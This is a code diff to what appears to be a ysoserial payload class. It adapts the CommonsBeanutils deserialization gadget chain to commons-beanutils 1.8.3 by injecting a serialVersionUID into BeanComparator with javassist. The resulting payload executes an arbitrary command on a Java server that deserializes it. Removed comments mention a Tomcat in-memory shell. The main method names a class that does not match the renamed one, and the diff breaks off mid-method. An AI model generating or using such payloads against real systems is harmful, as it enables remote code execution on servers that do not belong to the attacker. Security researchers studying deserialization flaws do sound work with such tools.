@@ -1,5 +1,8 @@
 package ysoserial.payloads;
 
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtField;
 import org.apache.commons.beanutils.BeanComparator;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
@@ -10,36 +13,35 @@ import ysoserial.payloads.util.Reflections;
 import java.util.PriorityQueue;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
 @Authors({Authors.Y4ER})
-public class CommonsBeanutils1NOCC implements ObjectPayload<Object> {
+public class CommonsBeanutils183NOCC implements ObjectPayload<Object> {
+    public static void main(String[] args) throws Exception {
+        PayloadRunner.run(CommonsBeanutils192NOCC.class, args);
 
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);
-//        String encode = BASE64Encoder.class.newInstance().encode(ClassFiles.classAsBytes(SpringInterceptorTemplate.class)).replaceAll("\n", "");
-//        System.out.println(encode.replaceAll("\n", ""));
-//
-//        Object object = new CommonsBeanutils1NOCC().getObject("CLASS:TomcatListenerMemShellFromJMX");
-//        File file = new File("c:\\users\\ddd\\desktop\\ser.ser");
+//        Object object = new CommonsBeanutils183NOCC().getObject("open -a Calculator.app");
+//        File file = new File("/tmp/ser.ser");
 //        if (file.exists()) file.delete();
 //        Serializer.serialize(object, new FileOutputStream(file));
     }
 
-    public Object getObject(final String command) throws Exception {
+    @Override
+    public Object getObject(String command) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(command);
-        // mock method name until armed
-        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
-        // create queue with numbers and basic comparator
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
+        CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
+        ctClass.addField(field);
+        Class beanCompareClazz = ctClass.toClass();
+        BeanComparator comparator = (BeanComparator) beanCompareClazz.newInstance();
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        // stub data for replacement later
-//        queue.add(new BigInteger("1"));
-//        queue.add(new BigInteger("1"));
         queue.add("1");
         queue.add("1");
 
         // switch method called by comparator
         Reflections.setFieldValue(comparator, "property", "outputProperties");
+        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
 
         // switch contents of queue
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
